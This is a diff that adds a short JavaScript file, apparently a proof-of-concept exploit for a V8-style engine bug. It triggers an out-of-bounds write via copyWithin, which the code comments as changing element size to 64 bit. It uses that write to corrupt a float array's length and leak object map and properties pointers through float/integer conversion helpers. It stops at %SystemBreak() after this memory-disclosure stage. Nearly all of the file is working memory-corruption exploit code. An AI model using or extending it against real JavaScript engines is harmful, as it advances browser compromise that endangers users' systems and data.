@@ -1,0 +1,62 @@
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+
+function ftoi(val) {
+	f64_buf[0] = val;
+	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+}
+
+function itof(val) {
+	u64_buf[0] = Number(val & 0xffffffffn);
+	u64_buf[1] = Number(val >> 32n);
+	return f64_buf[0];
+}
+
+function hprint(val) {
+	console.log("0x"+val.toString(16));
+}
+
+function gc() {
+	for (let i = 0; i < 100; i++) {
+		new ArrayBuffer(0x100000);
+	}
+}
+
+function trigger() {
+	var arr = new Uint8Array(8);
+	var normal_arr = [1.1];
+	var object = {};
+	var object_arr = [object];
+	arr[0] = 0 ;
+	arr[1] = 1 ;
+	arr[2] = 2 ;
+	arr[3] = 3 ;
+	arr[4] = 4 ; 
+	arr[5] = 5 ;
+	arr[6] = 6 ;
+	arr[7] = 7 ;
+	arr.copyWithin(5,1,2,8); //bug element size changed to 64 bit
+	console.log(arr.length);
+	hprint(arr[104]);
+	arr[104] = 0xf8;
+	console.log(normal_arr.length);
+	return normal_arr;
+}
+
+gc();
+
+var corrupted_array = trigger();
+var obj_arr = [{},{}];
+if(corrupted_array.length != 0xf8/2) {
+	throw new "HK";
+}
+let float_arr_map = ftoi(corrupted_array[1])&0xffffffffn;
+let float_arr_properties = ftoi(corrupted_array[1])&0xffffffff00000000n >> ( 32n );
+let obj_arr_map = (ftoi(corrupted_array[24])&0xffffffff00000000n) >> ( 32n );
+hprint(obj_arr_map);
+hprint(float_arr_map);
+hprint(float_arr_properties);
+//%DebugPrint(corrupted_array);
+//%DebugPrint(obj_arr);
+%SystemBreak();
